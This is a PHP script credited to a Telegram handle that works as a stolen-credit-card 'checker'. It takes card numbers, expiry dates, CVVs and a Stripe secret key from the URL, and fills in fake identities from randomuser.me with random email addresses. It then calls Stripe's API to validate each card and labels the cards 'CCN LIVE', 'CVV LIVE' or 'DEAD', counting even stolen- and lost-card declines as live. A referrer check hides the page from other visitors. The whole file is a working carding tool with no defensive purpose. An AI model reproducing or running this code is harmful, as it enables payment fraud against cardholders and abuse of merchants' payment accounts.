<?php
//Script Author: SK SHAIKH https://t.me/SKSKH1

/*===[PHP Setup]==============================================*/
error_reporting(0);
ini_set('display_errors', 0);

/*===[Security Setup]=========================================*/
include './config.php';
if ($_GET['referrer'] != "SK") { 
    $i = rand(0,sizeof($red_link));
    header("location: $red_link[$i]");
    exit();
}

/*===[Variable Setup]=========================================*/
$cc_info = $_GET['cc_info'];
$sk = $_GET['sk'];

/*===[CC Info Validation]=====================================*/
if($cc_info == "" || $sk == ""){
    exit();
}

/*===[Variable Setup]=========================================*/
$i = explode("|", $cc_info);
$cc = $i[0];
$mm = $i[1];
$yyyy = $i[2];
$yy = substr($yyyy, 2, 4);
$cvv = $i[3];
$bin = substr($cc, 0, 8);
$last4 = substr($cc, 12, 16);
$email = urlencode(emailGenerate());
$m = ltrim($mm, "0");

/*===[Identity Setup]=========================================*/
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
$infos = json_decode($get, 1);
$name_first = $infos['results'][0]['name']['first'];
$name_last = $infos['results'][0]['name']['last'];
$name_full = ''.$name_first.' '.$name_last.'';

$location_street = $infos['results'][0]['location']['street'];
$location_city = $infos['results'][0]['location']['city'];
$location_state = $infos['results'][0]['location']['state'];
$location_postcode = $infos['results'][0]['location']['postcode'];
if ($location_state == "Alabama") {
    $location_state = "AL";
} else if ($location_state == "alaska") {
    $location_state = "AK";
} else if ($location_state == "arizona") {
    $location_state = "AR";
} else if ($location_state == "california") {
    $location_state = "CA";
} else if ($location_state == "colorado") {
    $location_state = "CO";
} else if ($location_state == "connecticut") {
    $location_state = "CT";
} else if ($location_state == "delaware") {
    $location_state = "DE";
} else if ($location_state == "district of columbia") {
    $location_state = "DC";
} else if ($location_state == "florida") {
    $location_state = "FL";
} else if ($location_state == "georgia") {
    $location_state = "GA";
} else if ($location_state == "hawaii") {
    $location_state = "HI";
} else if ($location_state == "idaho") {
    $location_state = "ID";
} else if ($location_state == "illinois") {
    $location_state = "IL";
} else if ($location_state == "indiana") {
    $location_state = "IN";
} else if ($location_state == "iowa") {
    $location_state = "IA";
} else if ($location_state == "kansas") {
    $location_state = "KS";
} else if ($location_state == "kentucky") {
    $location_state = "KY";
} else if ($location_state == "louisiana") {
    $location_state = "LA";
} else if ($location_state == "maine") {
    $location_state = "ME";
} else if ($location_state == "maryland") {
    $location_state = "MD";
} else if ($location_state == "massachusetts") {
    $location_state = "MA";
} else if ($location_state == "michigan") {
    $location_state = "MI";
} else if ($location_state == "minnesota") {
    $location_state = "MN";
} else if ($location_state == "mississippi") {
    $location_state = "MS";
} else if ($location_state == "missouri") {
    $location_state = "MO";
} else if ($location_state == "montana") {
    $location_state = "MT";
} else if ($location_state == "nebraska") {
    $location_state = "NE";
} else if ($location_state == "nevada") {
    $location_state = "NV";
} else if ($location_state == "new hampshire") {
    $location_state = "NH";
} else if ($location_state == "new jersey") {
    $location_state = "NJ";
} else if ($location_state == "new mexico") {
    $location_state = "NM";
} else if ($location_state == "new york") {
    $location_state = "LA";
} else if ($location_state == "north carolina") {
    $location_state = "NC";
} else if ($location_state == "north dakota") {
    $location_state = "ND";
} else if ($location_state == "Ohio") {
    $location_state = "OH";
} else if ($location_state == "oklahoma") {
    $location_state = "OK";
} else if ($location_state == "oregon") {
    $location_state = "OR";
} else if ($location_state == "pennsylvania") {
    $location_state = "PA";
} else if ($location_state == "rhode Island") {
    $location_state = "RI";
} else if ($location_state == "south carolina") {
    $location_state = "SC";
} else if ($location_state == "south dakota") {
    $location_state = "SD";
} else if ($location_state == "tennessee") {
    $location_state = "TN";
} else if ($location_state == "texas") {
    $location_state = "TX";
} else if ($location_state == "utah") {
    $location_state = "UT";
} else if ($location_state == "vermont") {
    $location_state = "VT";
} else if ($location_state == "virginia") {
    $location_state = "VA";
} else if ($location_state == "washington") {
    $location_state = "WA";
} else if ($location_state == "west virginia") {
    $location_state = "WV";
} else if ($location_state == "wisconsin") {
    $location_state = "WI";
} else if ($location_state == "wyoming") {
    $location_state = "WY";
} else {
    $location_state = "KY";
}


/*===[cURL Processes]=========================================*/
/* 1st cURL */
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&owner[name]=$name_full&owner[email]=$email&owner[address][line1]=$location_street&owner[address][city]=$location_city&owner[address][state]=$location_state&owner[address][postal_code]=$location_postcode&owner[address][country]=US&card[number]=$cc&card[exp_month]=$mm&card[exp_year]=$yyyy&card[cvc]=$cvv");
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result1 = curl_exec($ch);
curl_close($ch);

/* 1st cURL Results */
$res1 = json_decode($result1, 1);
$src = $res1['id'];

if (isset($src)) {
    /* 2nd cURL */
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "description=SK&source=$src");
    curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result2 = curl_exec($ch);
    curl_close($ch);

    /* 2nd cURL Results */
    $res2 = json_decode($result2, 1);
    $cus = $res2['id'];

}

if (isset($res2['id'])&&!isset($res2['sources'])) {
    /* 3rd cURL */
    $ch3 = curl_init();
    curl_setopt($ch3, CURLOPT_URL, "https://api.stripe.com/v1/customers/$cus/sources/$src");
    curl_setopt($ch3, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch3, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch3, CURLOPT_USERPWD, $sk . ':' . '');
    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    curl_setopt($ch3, CURLOPT_HTTPHEADER, $headers);
    $curl3 = curl_exec($ch3);
    curl_close($ch3);

    /* 3rd cURL Response */
    $res3 = json_decode($curl3, true);

}

/*===[cURL Response Setup]====================================*/
if (isset($res1['error'])) {
    //DEAD
    $code = $res1['error']['code'];
    $decline_code = $res1['error']['decline_code'];
    $message = $res1['error']['message'];

    if(isset($res1['error']['decline_code'])){
        $codex = $decline_code;
    }else{
        $codex = $code;
    }
    $err = ''.$res1['error']['message'].' '.$codex;
    
    if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
        //CCN LIVE
        echo '<div class="live_ccn" style="display:none;">
        <span class="badge badge-warning">CCN LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
        </div>';
    }elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
        //CVV LIVE: Insufficient Funds
        echo '<div class="live_cvv" style="display:none;">
        <span class="badge badge-primary">CVV LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
        </div>';
    }elseif($code == "stolen_card"||$decline_code == "stolen_card"){
        //CCN LIVE: Lost Card
        echo '<div class="live_ccn" style="display:none;">
            <span class="badge badge-warning">CCN LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
            </div>';
    }elseif($code == "lost_card"||$decline_code == "lost_card"){
        //CCN LIVE: Stolen Card
        echo '<div class="live_ccn" style="display:none;">
        <span class="badge badge-warning">CCN LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
        </div>';
    }elseif(strpos($result1, 'Sending credit card numbers directly to the Stripe API is generally unsafe.')) {
        //INTEGRATION ON
        echo '<div class="dead" style="display:none;">
        <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
        </div>';
    }elseif($code == "testmode_charges_only"||$decline_code == "testmode_charges_only"){
        //TESTMODE CHARGES
        echo '<div class="dead" style="display:none;">
            <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' >> Token Error</span>
            </div>';
    }elseif($res1['error']['type'] == "invalid_request_error"){
        //TESTMODE CHARGES
        echo '<div class="dead" style="display:none;">
            <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' >> Invalid SK Provided</span>
            </div>';
    }elseif(strpos($result1, "You must verify a phone number on your Stripe account before you can send raw credit card numbers to the Stripe API.")){
        //VERIFY NUMBER
        echo '<div class="dead" style="display:none;">
        <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
        </div>';
    }else{
        //DEAD
        echo '<div class="dead" style="display:none;">
        <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
        </div>';
    }
}else{
    if (isset($res2['error'])) {
        //DEAD
        $code = $res2['error']['code'];
        $decline_code = $res2['error']['decline_code'];
        $message = $res2['error']['message'];
        if(isset($res2['error']['decline_code'])){
            $codex = $decline_code;
        }else{
            $codex = $code;
        }
        $err = ''.$res2['error']['message'].' '.$codex;

        if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
            //CCN LIVE
            echo '<div class="live_ccn" style="display:none;">
            <span class="badge badge-warning">CCN LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
            </div>';
        }elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
            //CVV LIVE: Insufficient Funds
            echo '<div class="live_cvv" style="display: none;">
            <span class="badge badge-primary">CVV LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
            </div>';
        }elseif($code == "stolen_card"||$decline_code == "stolen_card"){
            //CCN LIVE: Stolen Card
            echo '<div class="live_ccn" style="display:none;">
            <span class="badge badge-warning">CCN LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
            </div>';
        }elseif($code == "lost_card"||$decline_code == "lost_card"){
            //CCN LIVE: Lost Card
            echo '<div class="live_ccn" style="display:none;">
            <span class="badge badge-warning">CCN LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
            </div>';
        }else{
            //DEAD
            echo '<div class="dead" style="display:none;">
            <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' >> '.$err.'</span>
            </div>';
        }
    }else{
        if (isset($res2['sources'])) {
            $cvc_res2 = $res2['sources']['data'][0]['card']['cvc_check'];
            if($cvc_res2 == "pass"||$cvc_res2 == "success"){
                //CVV MATCH CONGRATS
                echo '<div class="live_cvv" style="display:none;">
                <span class="badge badge-primary">CVV LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' >> cvc_check : '.$cvc_res2.'</span>
                </div>';
            }else{
                //DEAD
                echo '<div class="dead" style="display:none;">
                <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' >> cvc_check : '.$cvc_res2.'</span>
                </div>';
            }
        }else{
            $cvc_res3 = $res3['card']['cvc_check'];
            if($cvc_res3 == "pass"||$cvc_res3 == "success"){
                //CVV MATCH CONGRATS
                echo '<div class="live_cvv" style="display:none;">
                <span class="badge badge-primary">CVV LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' >> cvc_check : '.$cvc_res3.'</span>
                </div>';
            }else{
                //DEAD
                echo '<div class="dead" style="display:none;">
                <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' >> cvc_check : '.$cvc_res3.'</span>
                </div>';
            }
        }
    }
}






/*===[PHP Functions]==========================================*/
function emailGenerate($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString.'@gmail.com';
}
?>
